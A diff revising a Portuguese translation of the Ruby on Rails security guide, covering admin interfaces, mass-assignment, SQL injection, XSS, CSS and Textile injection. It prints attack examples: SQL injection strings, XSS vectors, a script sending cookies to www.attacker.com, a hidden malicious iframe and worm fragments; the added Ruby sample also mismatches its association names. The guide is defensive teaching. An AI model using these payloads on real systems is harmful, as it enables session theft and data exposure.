@@ -343,8 +343,6 @@ send_file filename, :disposition => 'inline'
 
 Outra estratégia (adicional) é armazenar o nome dos arquivos no banco de dados e nomear os arquivos em disco a partir dos ids dos registros. Esta também é uma boa estratégia para evitar que seja executado qualquer código existente nos arquivos enviados. O plugin attachment_fu faz isso de forma similar.
 
-PAREI AQUI
-
 h3. Segurança Administrativa e em Intranets
 
 -- _Interfaces administrativas e de intranet são alvos populares para ataques, porque eles permitem acesso privilegiado. Apesar desse tipo de situação exigir que diversas medidas de segurança adicionais sejam adotadas, o oposto é o que realmente ocorre no mundo real._
@@ -359,7 +357,7 @@ Leia a seção sobre Injeção para aprender medidas preventivas contra XSS. É 
 
 *CSRF*  Cross-Site Reference Forgery (CSRF) é um método de ataque bastante poderoso, o qual permite que o atacante faça tudo que um administrador ou usário da Intranet podem fazer. Como você já viu acima como o CSRF funciona, aqui estão alguns exemplos do que atacantes podem fazer na Intranet ou interface administrativas.
 
-Um exemplo real é uma "reconfiguração de roteador por CSRF":http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html. Os atacantes enviam um e-mail malicioso, contendo CSRF, para usuários mexicanos. O e-mail afirma que existe um e-card aguardando por eles, mas também contém uma tag image que resulta em request HTTP Get para reconfigurar o roteador do usuário (o qual é um modelo popular no México). O request altera as configurações de DNS de forma que requests para um banco sediado no México sejam mapeados para o site do atacante. Todos que acessarem o site do banco através deste roteador verão o site falso do atacante e terão seus dados roubados.
+Um exemplo real é uma "reconfiguração de roteador por CSRF":http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_wild.html. Os atacantes enviam um e-mail malicioso, contendo CSRF, para usuários mexicanos. O e-mail afirma que existe um e-card aguardando por eles, mas também contém uma tag image que resulta em request HTTP Get para reconfigurar o roteador do usuário (o qual é um modelo popular no México). O request altera as configurações de DNS de forma que requests para um banco sediado no México sejam mapeados para o site do atacante. Todos que acessarem o site do banco através deste roteador verão o site falso do atacante e terão seus dados roubados.
 
 Outro exemplo altera o endereço de e-mail e o password do Goggle Adsense através de "CSRF":http://www.0x000000.com/index.php?i=213&bin=11010101. Caso a vítima se autentique no Google Adsense, a interface administrativa para campanhas de propaganda do Google, um atacante pode roubar seus dados.
 
@@ -372,7 +370,7 @@ h4. Precaues adicionais
 
 A interface de administração comum funciona da seguinte maneira: está localizada em www.example.com/admin, pode ser acessada somente se a flag 'admin' estiver definida como 'true' no model User, re-apresenta input do usuário e permite que o administrador apague/adicione/edite quaisquer dados. Aqui vão algumas idéias sobre isso:
 
-* É muito importante que _(highlight)se pense no pior caso_: O que acontece caso alguém se apodere do meu cookie ou credenciais de usuário? Você pode _(highlight_introduzir perfis_ na interface administrativa para limitar as possibilidades do atacante. Ou que tal _(highlight)credenciais de login especiais_ para a interface administrativa, diferentes das normalmente utilizadas para a parte pública da aplicação? Ou _(highlight)senhas especiais para ações realmente críticas_?
+* É muito importante que _(highlight)se pense no pior caso_: O que acontece caso alguém se apodere do meu cookie ou credenciais de usuário? Você pode _(highlight)introduzir perfis_ na interface administrativa para limitar as possibilidades do atacante. Ou que tal _(highlight)credenciais de login especiais_ para a interface administrativa, diferentes das normalmente utilizadas para a parte pública da aplicação? Ou _(highlight)senhas especiais para ações realmente críticas_?
 
 * Será que o administrador realmente precisa ter acesso a interface de administração a partir de qualquer lugar no mundo? Pense sobre _(highlight)limitar o login à uma lista de endereços de IP de origem_. Examine o <tt>request.remote_ip</tt> para verificar o endereço IP do usuário. Isso não é algo "à prova de balas", mas é uma grande barreira. Lembre-se que o atacante pode estar utilizando um proxy.
 
@@ -405,6 +403,23 @@ params[:user] #=> {:name => “ow3ned”, :admin => true}
 
 Logo, se você criar um novo usuário utilizando mass-assignment, pode ser muito fácil se tornar um administrador.
 
+Perceba que esta vulnerabilidade não é restrita a colunas de banco de dados. Qual método setter, que não seja explicitamente protegido, é acessível via
+<tt>attributes=</tt>. De fato, esta vulnerabilidade e estendida mais ainda com introdução do mass-assignment aninhado (e objetos form aninhados) no Rails 2.3.  A declaração +accepts_nested_attributes_for+ nos provê a possibilidade de estender o mass-assignment para as associações (+has_many+, +has_one+, +has_and_belongs_to_many+).  Por exemplo:
+
+<ruby>
+  class Person < ActiveRecord::Base
+    has_many :credits
+
+    accepts_nested_attributes_for :children
+  end
+
+  class Child < ActiveRecord::Base
+    belongs_to :person
+  end  
+</ruby>
+
+Como resultado, a vulnerabilidade é estendida além de apenas expor colunas para atribuição, permitindo o atacante a habilidade de criar registros inteiros em tabelas associadas (filho, neste caso).
+
 h4. Medidas preventivas
 
 Para evitar que isso ocorra, o Rails fornece dois métodos da classe ActiveRecord para controlar acesso aos seus atributos. O método <tt>attr_protected</tt> recebe uma lista de atributos que não serão acessíveis por mass-assignment. Por exemplo:
@@ -436,7 +451,7 @@ h3. Gerenciamento de usuários
 
 Existem alguns plugins para autorização e autenticação disponíveis para o Rails. Um que seja bom deverá salvar apenas passwords encriptados, não passwords em claro. O plugin mais popular é o _(highlight)restful_authentication_, o qual também possui proteção contra fixação de sessão. Entretanto, versões mais antigas permitiam que você se logassse sem um nome de usuário ou password em algumas circunstâncias.
 
-Cada novo usuário ganha um código de ativação para ativar sua conta quando recebe um email contendo um link. Após ativar a conta, a coluna com o código de ativação terá seu valor atualizado para NULL no banco de dados. Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):
+Cada novo usuário ganha um código de ativação para ativar sua conta quando recebe um email contendo um link. Após ativar a conta, a coluna com o código de ativação terá seu valor atualizado para NULL no banco de dados. Se alguem requisitar uma URL como abaixo, ele deve estar logado com o primeiro usuário ativo encontrado no banco de dados (e existem changes que ele seja o administrador):
 
 <pre>
 http://localhost:3006/user/activate
@@ -459,7 +474,7 @@ encontrando assim o primeiro usuário no banco de dados, retornando-o e logando-
 
 h4. Ataques de força bruta contra contas
 
--- _Ataques de fora bruta sobre contas são ataques de tentativa e erro contra as credenciais de loging. Defenda-se destes ataques utilizando mensagens de erro mais genéricas e possivelmente solicitando que seja informado um CAPTCHA._
+-- _Ataques de fora bruta sobre contas são ataques de tentativa e erro contra as credenciais de login. Defenda-se destes ataques utilizando mensagens de erro mais genéricas e possivelmente solicitando que seja informado um CAPTCHA._
 
 Uma lista com os nomes de usuário da sua aplicação pode ser mal utilizada, usando-se força bruta para tentar descobrir os respectivos passwords, porque a maioria das pessoas não utiliza passwords sofisticados. A maioria dos passwords são uma combinação de palavras do dicionário e possivelmente números. Assim, de posse de uma lista com os nomes de usuários e um dicionário, um programa automático pode encontrar o password correto em questão de minutos.
 
@@ -483,7 +498,7 @@ Entretanto, o atacante também pode roubar a conta alterando o endereço de emai
 
 h5. Outros 
 
-Dependendo da sua aplicação web, podem haver mais formas de sequestrar a conta de um usuário. Em muitos casos XSS e CSRF ajudarão nisto. Por exemplo, como uma vulnerabilidade no "Google Mail":http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. Neste ataque de prova de conceito, a vítima seria levada a um web site controlado pelo atacante. Neste site existe uma tag IMG preparada que resultada em um request HTTP GET que altera as configurações de filtros do Google Main. Se a vítima estiver logada no Google Mail, o atacante poderia alterar os filtros para redirecionar todos os emails para o seu endereço de email. Isso é praticamente tão danoso quanto capturar toda a conta. Como uma medidaa preventiva, _(highlight)reveja a lógica da sua aplicação e elimine todas as vulnerábilidades de XSS e CSRF_.
+Dependendo da sua aplicação web, podem haver mais formas de sequestrar a conta de um usuário. Em muitos casos XSS e CSRF ajudarão nisto. Por exemplo, como uma vulnerabilidade no "Google Mail":http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. Neste ataque de prova de conceito, a vítima seria levada a um web site controlado pelo atacante. Neste site existe uma tag IMG preparada que resulta em um request HTTP GET para alterar as configurações de filtros do Google Mail. Se a vítima estiver logada no Google Mail, o atacante poderia alterar os filtros para redirecionar todos os emails para o seu endereço de email. Isto é praticamente tão danoso quanto capturar toda a conta. Como uma medida preventiva, _(highlight)reveja a lógica da sua aplicação e elimine todas as vulnerábilidades de XSS e CSRF_.
 
 h4. CAPTCHAs
 
@@ -491,10 +506,10 @@ h4. CAPTCHAs
 
 Mas robôs de spam (bots) não são o único problema, existem também os bots de login automático. Uma API para CAPTCHA popular é a "reCAPTCHA":http://recaptcha.net/ a qual exibe duas imagens distorcidas de palavras de livros antigos. Também adiciona uma linha inclinada, ao invés de um fundo distorcido e letras deformadas como os primeiros CAPTCHAS fizeram, porque o segundo caso tinha problemas. Como um bonus, utilizar reCAPTCHA ajuda a digitalizar livros antigos. O "ReCAPTCHA":http://ambethia.com/recaptcha/ é também um plugin para o Rails com o mesmo nome da API.
 
-Você vai receber duas chaves da API, uma pública e outra privada, a qual você deve colocar no eu ambiente Rails. Após isso vocë pode utilizar o método +recaptcha_tags+ na sua view e o método +verify_recaptcha+ no controller. +verify_recaptcha+ retornará false caso a validação falhe. 
+Você vai receber duas chaves da API, uma pública e outra privada, a qual você deve colocar no eu ambiente Rails. Após isso você pode utilizar o método +recaptcha_tags+ na sua view e o método +verify_recaptcha+ no controller. +verify_recaptcha+ retornará false caso a validação falhe. 
 O problema com CAPTCHA é que eles sào irritantes. Além disso, alguns usuários com deficiências visuais têm achado certos tipos de CAPTCHAs distorcidos difíceis de ler. A idéia de CAPTCHAs negativos não é pedir ao usuário uma prova de que ele é humano, mas revelar que um robô de spam é um bot.
 
-A maioria dos bots é realmente burra, eles rastreiam a web e colocam spam em cada campo de formulário que eles conseguem encontrar. CAPTCHAs negativos usam isso como vantagem e incluem um campo "honeypot" no formulário que ficará escondido de usuários humanos através de CSS ou JavaScript.
+A maioria dos bots é realmente burro, eles rastreiam a web e colocam spam em cada campo de formulário que eles conseguem encontrar. CAPTCHAs negativos usam isso como vantagem e incluem um campo "honeypot" no formulário que ficará escondido de usuários humanos através de CSS ou JavaScript.
 
 Aqui estão algumas idéias de como esconder campos "honeypot" através de JavaScript e/ou CSS:
 
@@ -561,7 +576,7 @@ Onde %0A é uma nova linha em codificação de URL, logo o Rails irá converter 
 
 h4. Aumento de privilégios
 
--- _Alterar um único parâmetro pode permitir acesso não autorizado ao usuário. Lembre-se de que todo parâmetro pode ser alterado, não importa o quanto você o esconda ou obfusque._
+-- _Alterar um único parâmetro pode permitir acesso não autorizado ao usuário. Lembre-se de que todo parâmetro pode ser alterado, não importa o quanto você o esconda ou ofusque._
 
 O parâmetro mais comum que o usuário pode alterar é o parâmetro id, como em +":id":http://www.domain.com/project/1+, onde 1 é o id. Esse parâmetro estará disponível no +params+ no seu controller. Lá, você provavelmente fará algo como isso:
 
@@ -575,9 +590,9 @@ Isso está correto para algumas aplicações web, mas provavelmente não está c
 @project = @current_user.projects.find(params[:id])
 </ruby>
 
-Dependendo da sua aplicação web, podem existir muitos outros parâmetros que o usuário pode alterar. Como regra, _(highlight)nenhuma informação fornecida pelo usuário é segura, até prova contrária, e todo parâmetro vindo do usuário foi possivelmente manipulado_.
+Dependendo da sua aplicação web, podem existir muitos outros parâmetros que o usuário pode alterar. Como regra, _(highlight)nenhuma informação fornecida pelo usuário é segura, até que prove o contrário, e todo parâmetro vindo do usuário foi possivelmente manipulado_.
 
-Não se engaane com segurança através de obfuscação e JavaScript. O plugin Web Developer Toolbar para o Mozilla Firefox permite que você altere todos os campos escondidos de um formulário. _(highlight)JavaScript pode ser utilizado para validar os dados fornecidos por usuários, mas certamente não impedem que atacantes enviem requests inesperados com valores maliciosos_. O Live Http Headers para o Mozilla Firefox faz log de cada request e é capaz de repeti-los e alterá-los. Essa é uma forma fácil de burlar validações de JavaScript. Existem até mesmo proxies para o lado cliente que permitem que você intercepte qualquer request e response provenientes da Internet ou sendo enviados para ela.
+Não se engane com segurança através de ofuscação e JavaScript. O plugin Web Developer Toolbar para o Mozilla Firefox permite que você altere todos os campos escondidos de um formulário. _(highlight)JavaScript pode ser utilizado para validar os dados fornecidos por usuários, mas certamente não impedem que atacantes enviem requests inesperados com valores maliciosos_. O Live Http Headers para o Mozilla Firefox faz log de cada request e é capaz de repeti-los e alterá-los. Essa é uma forma fácil de burlar validações de JavaScript. Existem até mesmo proxies para o lado cliente que permitem que você intercepte qualquer request e response provenientes da Internet ou sendo enviados para ela.
 
 h3. Injeção 
 
@@ -599,7 +614,7 @@ Uma blacklist pode ser uma lista com endereços de e-mail inválidos, ações n�
 ** Isso fará com que o ataque funcione: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
 ** Mas recuse input mal formatado.
 
-Whitelists também são uma boa abordagem contra o fator humanos de esquecer algo na blacklist.
+Whitelists também são uma boa abordagem contra o fator humano de esquecer algo na blacklist.
 
 h4. Injection de SQL
 
@@ -619,7 +634,7 @@ Esta poderia ser uma action para buscar e o usuário poderia informar o nome do 
 SELECT * FROM projects WHERE name = '' OR 1 --'
 </pre>
 
-Os dois traços iniciam um comentário ignorando tudo o que vem a seguir. Assim a query retorna todos os rgistros da tabela projects incluindo aqueles que deveria ficar escondidos do usuário. Isso acontece porque a condição é verdadeira para todos os registros.
+Os dois traços iniciam um comentário ignorando tudo o que vem a seguir. Assim a query retorna todos os rgistros da tabela projects incluindo aqueles que deveriam ficar escondidos do usuário. Isso acontece porque a condição é verdadeira para todos os registros.
 
 
 h5. Burlando autorização
@@ -632,9 +647,9 @@ User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password
 
 Se um atacante entrar ' OR '1'='1 como o nome, e ' OR '2'>'1 como o password, a query SQL resultante seria:
 
-<pre>
+<sql>
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
-</pre>
+</sql>
 
 Isso irá simplesmente retornar o primeiro registro no banco de dados e dará acesso ao usuário.
 
@@ -649,16 +664,16 @@ Project.find(:all, :conditions => "name = '#{params[:name]}'")
 
 E agora vamos injetar outra query utilizando a declaração UNION
 
-<pre>
+<sql>
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
-</pre>
+</sql>
 
 Isso irá resultar na seguinte query SQL:
 
-<pre>
+<sql>
 SELECT * FROM projects WHERE (name = '') UNION 
   SELECT id,login AS name,password AS description,1,1,1 FROM users --')
-</pre>
+</sql>
 
 O resultado não será uma lista de projetos (porque não existe projeto com um nome vazio), mas uma lista com os nomes dos usuários e seus passwords. Espera-se que você tenha criptografado os passwords no banco de dados! O único problema para o atacante é que o número de colunas deve ser o mesmo em ambas as queries. É por isso que a segunda query inclue uma lista de uns (1), o qual será sempre o valor 1, de forma a casar o número de colunas na primeira query.
 
@@ -682,7 +697,6 @@ Model.find(:first, :conditions => {:login => entered_user_name, :password => ent
 
 A forma de array ou hash estão disponíveis apenas em instâncias de models. Você pode utilizar +sanitize_sql()+ nos demais locais. _(highlight)Torne um hábito pensar sobre as consequências com segurança quando estiver utilizando um string externa no SQL_.
 
-
 h4. Cross-Site Scripting (XSS)
 
 -- _As vulnearabilidades mais conhecidas e mais devastadoras em aplicações web são as de XSS. O ataque malicioso injeta código executável do lado cliente. O Rails fornece métodos auxiliares (helpers) para nos defender destes ataques._
@@ -701,40 +715,40 @@ Uma forma de ponto de entrada relativamente nova, e incomum, são as propagandas
 
 h5. Injeção de HTML/JavaScript
 
-TA linguagem mais comum para XSS é óbviamente a linguagem mais comum para scripting do lado cliente, o JavaScript, normalmente combinado com HTML. _(highlight)Filtrar dados fornecidos pelo usuário é essencial_.
+A linguagem mais comum para XSS é óbviamente a linguagem mais comum para scripting do lado cliente, o JavaScript, normalmente combinado com HTML. _(highlight)Filtrar dados fornecidos pelo usuário é essencial_.
 
 Aqui está a forma mais simples de verificar se existe XSS:
 
-<pre>
+<html>
 <script>alert('Hello');</script>
-</pre>
+</html>
 
 Este código JavaScript irá aṕenas exibir uma caixa de alerta. Os próximos exemplos fazem exatamente a mesma coisa, porém em locais bastante incomuns.
 
-<pre>
+<html>
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
-</pre>
+</html>
 
 h6. Roubo de cookies
 
 Estes exemplos não fazem mal algum até agora, então vamos ver como um atacante pode roubar o cookie do usuário (e assim sequestrar a sessão do usuário). Em JavaScript você pode usar a propriedade +document.cookie+ para ler e escrever o cookie do documento. O JavaScript aplica a política de mesma origem, o que significa que um script de um domínio não pode acessar cookies de outro domínio. A propriedade +document.cookie+ possui o cookie do servidor web de origem. Entretanto, você pode ler e escrever essa propriedade, se você embutir o código diretamente no documento HTML (como acontece no XSS). Injete isso em qualquer local na sua aplicação web para ver seu próprio cookie  na página resultante:
 
-<pre>
+<plain>
 <script>document.write(document.cookie);</script>
-</pre>
+</plain>
 
 Para um atacante, é claro, isso não tem utilidade, já que a vítima verá seu próprio cookie. O exemplo a seguir tentará carregar uma imagem da URL http://www.attacker.com/ mais o cookie. Claro que essa URL não existe, logo o navegador não exibe nada. Mas o atacante pode verificar seus arquivos de log em seu servidor web para ver o cookie da vítima.
 
-<pre>
+<html>
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
-</pre>
+</html>
 
 Os arquivos de log em www.attacker.com terão o seguinte conteúdo:
 
-<pre>
+<plain>
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
-</pre>
+</plain>
 
 Você pode acabar com esses ataques (de forma óbvia) adicionando a flag "httpOnly":http://dev.rubyonrails.org/ticket/8895 aos cookies, assim +document.cookie+ não poderá ser lido através de JavaScript. Cookies do Http Only podem ser lidos pelo IE v6.SP1, Firefox v2.0.0.5 e Opera 9.5. O Safari ainda está analisando essa possibilidade e ignora essa opção. Mas outros browsers mais antigos (como o WebTV e IE 5.5 no Mac) podem na verdade fazer com que a página não carregue. Esteja avisado de que cookies "ainda serão visíveis usando Ajax"::http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/
 
@@ -742,9 +756,9 @@ h6. Defacement
 
 Com defacement de páginas web um atacante pode fazer muitas coisas, por exemplo, apresentar informação falsa ou levar a vítima até o site do atacante para roubar seu cookie, credenciais de login outros dados importantes.
 
-<pre>
+<html>
 <iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
-</pre>
+</html>
 
 Isso carrega HTML e/ou Javascript arbitrários de uma fonte externa e os insere como parte do site. Este iFrame foi retirado de um "ataque real":http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html em sites Italianos legítimos usando o "Framework de ataques Mpack":http://isc.sans.org/diary.html?storyid=3015. O Mpack tenta instalar software malicioso através de falhas de segurança no navegador - com muito sucesso, 50% dos ataques obtiveram sucesso.
 
@@ -752,10 +766,10 @@ Um ataque mais especializado pode sobrepor todo o website ou exibir um formulár
 
 Ataques de injeção refletiva são aqueles onde o conteúdo não é armazenado para ser exibido para a vítima mais tarde, mas sim incluído na URL. Formulários de pesquisa geralmente falham em filtrar a string de pesquisa. O link a seguir apresentou uma página que dizia que "George Bush indicou um garoto de 9 anos para a presidência...":
 
-<pre>
+<plain>
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
-</pre>
+</plain>
 
 h6. Medidas preventivas
 
@@ -765,29 +779,29 @@ Especialmente para XSS, é importante _(highlight)filtrar baseado em whitelists 
 
 Imagine que uma blacklist remova o termo "script" dos dados fornecidos pelo usuário. Agora o atacante injeta “&lt;scrscriptipt&gt;”, e após o filtro ainda resta “&lt;script&gt;”. Versões iniciais do Rails usavam uma estratégia de blacklists para os métodos +strip_tags()+, +strip_links()+  e +sanitize()+. esse tipo de injeção era possível:
 
-<pre>
-strip_tags("some<<b>script>alert('hello')<</b>/script>") 
-</pre>
+<ruby>
+strip_tags("some<<b>script>alert('hello')<</b>/script>")
+</ruby>
 
 Isso retornava "some&lt;script&gt;alert('hello')&lt;/script&gt;", o que faz com que o ataque funcione. É por isso que eu prefiro uma abordagem usando whitelists, usando o método +sanitize()+ atualizado do Rails 2:
 
-<pre>
+<ruby>
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
-</pre>
+</ruby>
 
-Isso permite apenas as tags informadas e faz um bom trabalho, até mesmo contra todos os tipos de truques e tags malformadas.
+Isso permite apenas as tags informadas e faz um bom trabalho, até mesmo contra todos os tipos de truques e tags mal formadas.
 
 Como um segundo passo, _(highlight)é uma boa prática filtrar todos os dados de saída da aplicação_, especialmente quando estiver re-exibindo dados fornecidos pelo usuário, o qual não foi filtrado quando informado (como no formulário de busca mostrado anteriormente). _(highlight)Utilize o método +escapeHTML()+ (ou seu alias +h()) para substituir os caracteres HTML de entrada &amp;,",&lt;,&gt; por suas representações não interpretadas em HTML (&amp;, &quot;, &lt; and &gt;). Entretanto, pode facilmente acontecer do programador se esquecer de usar este método, logo _(highlight)recomenda-se utilizar o plugin "SafeErb":http://safe-erb.rubyforge.org/svn/plugins/safe_erb/ _. O SafeErb irá te lembrar de filtrar strings de fontes externas.
 
-h6. Injeção de obfuscação e enconding
+h6. Injeção de ofuscação e enconding
 
 O tráfego de rede é principalmente baseado no limitado alfabeto ocidental, logo novos encondings de caracteres, como o Unicode, surgiram para transmitir dados em outros idiomas. Mas, isso também é uma ameaça para aplicações web, uma vez que código malicioso pode ser escondido em encodings diferentes, os quais o navegador pode ser capaz de processar mas a aplicação web não. Aqui está um vetor de ataque em codificação UTF-8:
 
-<pre>
+<html>
 <IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
   &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
-</pre>
+</html>
 
 Este exemplo exibe uma caixa de mensagem. Porém ele será reconhecido pelo filtro +sanitize()+ mostrado acima. Uma grande ferramenta para obfuscar e codificar strings e assim "conhecer seu inimigo" , é o "Hackvertor":http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php. O método +sanitize()+ do Rails faz um bom trabalho em nos defender de de ataques de enconding.
 
@@ -797,13 +811,13 @@ _Para entender os ataques atuais feitos contra aplicações web, é melhor dar u
 
 O trecho a seguir for retirado do "worm":http://groovin.net/stuff/yammer.txt para o Yahoo! Mail de "Js.Yamanner@m":http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1 Ele apareceu em 11 de junho de 2006 e foi o primeiro worm para interface de webmail.
 
-<pre>
-<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
+<html>
+<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
-</pre>
+</html>
 
-O worm explora uma falha no filtro de HTML/JavaScript do Yahoo!, o qual normalmente filtra todos os atributos target e onload das tags (porque ali pode haver JavaScript). Entretanto, o filtro é aplicado apenas uma vez, logo o atributo onload com o código do worm não é removido. Este é um bom exemplo de porque filtros por blacklists nunca estão completos e porque é difícil permitir HTML/Javascript em uma aplicação web.
+O worm explora uma falha no filtro de HTML/JavaScript do Yahoo!, o qual normalmente filtra todos os atributos target e onload das tags (porque ali pode haver JavaScript). Entretanto, o filtro é aplicado apenas uma vez, logo o atributo onload com o código do worm não é removido. Este é um bom exemplo do porque filtros por blacklists nunca estão completos e porque é difícil permitir HTML/Javascript em uma aplicação web.
 
 Outro worm de prova de conceito é o Nduja, um worm de cross-domain para serviços de webmail italianos. Encontre mais detalhes de uma demonstração em vídeo no "Website de Rosario Valotta":http://rosario.valotta.googlepages.com/home. Ambos worms de webmail tem como objetivo coletar endereços de e-mail, algo com o qual hackers criminosos podem ganhar muito dinheiro.
 
@@ -813,33 +827,33 @@ O worm para MySpace Samy será discutido na seção sobre Injeção de CSS.
 
 h4. Injeção de CSS
 
--- _Injeção de CSS é na verdade injeção de JaavaScript, porque alguns navegadores (IE, algumas versões do Safari e outros) permitem JavaScript no CSS. Pense duas vezes antes de permitir CSS customizado na sua aplicação web._
+-- _Injeção de CSS é na verdade injeção de JavaScript, porque alguns navegadores (IE, algumas versões do Safari e outros) permitem JavaScript no CSS. Pense duas vezes antes de permitir CSS customizado na sua aplicação web._
 
 Injeção de CSS é melhor explicada por um worm bastante conhecido, o "worm para MySpace Samy":http://namb.la/popular/tech.html. Este worm envia uma solicitação de amigo automaticamente para Samy (o atacante) apenas visitando seu profile. Dentro de várias horas ele tinha mais de 1 milhão de solicitações de amigos, mas isso criou tráfego demais no MySpace, fazendo com que o site ficasse offline. A seguir temos uma explicação técnica do worm.
 
 O MySpace bloqueia várias tags, entretanto permite CSS. Dessa forma, o autor do worm insere JavaScript dentro do CSS assim:
 
-<pre>
+<html>
 <div style="background:url('javascript:alert(1)')">
-</pre>
+</html>
 
 O conteúdo vem no atributo style. Mas aspas não são permitidas no conteúdo, porque aspas simples e duplas já foram utilizadas. Porém o JavaScript possui uma função bastante útil chamada +eval()+, a qual executa qualquer string de código.
 
-<pre>
-<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> 
-</pre>
+<html>
+<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
+</html>
 
-A função +eval()+ é um pesadelo para filtros de input baseados em blacklists, pois permite que o atributo style esconde a palavra "innerHTML".
+A função +eval()+ é um pesadelo para filtros de input baseados em blacklists, pois permite que o atributo style esconda a palavra "innerHTML".
 
-<pre>
-alert(eval('document.body.inne' + 'rHTML')); 
-</pre>
+<plain>
+alert(eval('document.body.inne' + 'rHTML'));
+</plain>
 
 O próximo problema foi o MySpace filtrar a palavra "javascript", logo o autor usou “java&lt;NEWLINE&gt;script" para contornar:
 
-<pre>
+<html>
 <div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
-</pre>
+</html>
 
 Outro problema que o autor do worm teve foram os tokens de segurança contra CSRF. Sem eles ele não poderia enviar uma solicitação de amigo através de um POST. Ele contornou o problema enviando um GET para a página antes de adicionar um novo usuário e analisando o resultado para conseguir o token CSRF.
 
@@ -848,25 +862,25 @@ No fim, ele conseguiu um worm de 4 KB, o qual ele injetou em sua página de prof
 A propriedade CSS "moz-binding":http://www.securiteam.com/securitynews/5LP051FHPE.html se mostrou outra forma de introduzir JavaScript em CSS em navegadores baseados no Gecko (Firefox, por exemplo).
 
 h5. Medidas preventivas
-Este exemplo, novamente, mostrou que um filtro por blacklists nunca está completo. Entretanto, uma vez que CSS customizado em aplicações web é um recurso bastante raro, eu não tenho conhecimento de um filtro para CSS q  ue utilize whitelists. _(highlight)Se você quer permitir cores personalizadas ou imagens, você pode permitir que o usuário as escolha e então construir o CSS na aplicação web_. Use o método +sanitize()+ do Rails como um modelo para um filtro por whitelists, se você realmente precisar de um.
+Este exemplo, novamente, mostrou que um filtro por blacklists nunca está completo. Entretanto, uma vez que CSS customizado em aplicações web é um recurso bastante raro, eu não tenho conhecimento de um filtro para CSS que utilize whitelists. _(highlight)Se você quer permitir cores personalizadas ou imagens, você pode permitir que o usuário as escolha e então construir o CSS na aplicação web_. Use o método +sanitize()+ do Rails como um modelo para um filtro por whitelists, se você realmente precisar de um.
 
 h4. Injeção de textile
 
 -- _Se você quer fornecer formatação de texto que não seja por HTML (devido à segurança), use uma linguagem de marcação que seja convertida para HTML do lado servidor. "RedCloth":http://whytheluckystiff.net/ruby/redcloth/ é uma desas linguagens para Ruby, mas sem precauções, também é vulnerável a XSS._
 
-  Por exemplo, o RedCloth traduz _test_ para &lt;em&gt;test&lt;em&gt, o que faz com que o texto fique em itálico. Entretanto, até a versão 3.0.4, ainda é vulnerável a XSS. Pegue a "versão mais nota 4":http://www.redcloth.org que removeu diversos bugs. Entretanto, até mesmo essa versão possui "alguns bugs de segurança":http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html, logo as medidas preventivas ainda são aplicáveis. Aqui está um exemplo para a versão 3.0.4:
+Por exemplo, o RedCloth traduz _test_ para &lt;em&gt;test&lt;em&gt, o que faz com que o texto fique em itálico. Entretanto, até a versão 3.0.4, ainda é vulnerável a XSS. Pegue a "versão mais nova 4":http://www.redcloth.org que removeu diversos bugs. Entretanto, até mesmo essa versão possui "alguns bugs de segurança":http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html, logo as medidas preventivas ainda são aplicáveis. Aqui está um exemplo para a versão 3.0.4:
 
-<pre>
->> RedCloth.new('<script>alert(1)</script>').to_html
-=> "<script>alert(1)</script>"
-</pre>
+<ruby>
+RedCloth.new('<script>alert(1)</script>').to_html
+# => "<script>alert(1)</script>"
+</ruby>
 
 Utilize a opção +:filter_html+ para remover HTML que não tenha sido criado pelo processador de Textile.
 
-<pre>
->> RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
-=> "alert(1)"
-</pre>
+<ruby>
+RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
+# => "alert(1)"
+</ruby>
 
 Entretanto, isso não filtra todo o HTML, algumas tags serão deixadas (foi projetado dessa forma), por exemplo &lt;a&gt;:
 
@@ -883,13 +897,13 @@ h4. Injeção de Ajax
 
 -- _As mesmas precauções tomadas para actions "normais" devem ser tomadas para actions Ajax. Existe, entretanto, pelo menos uma exceção: O output deve ser filtrado já no controller, caso a action não renderize uma view_.
 
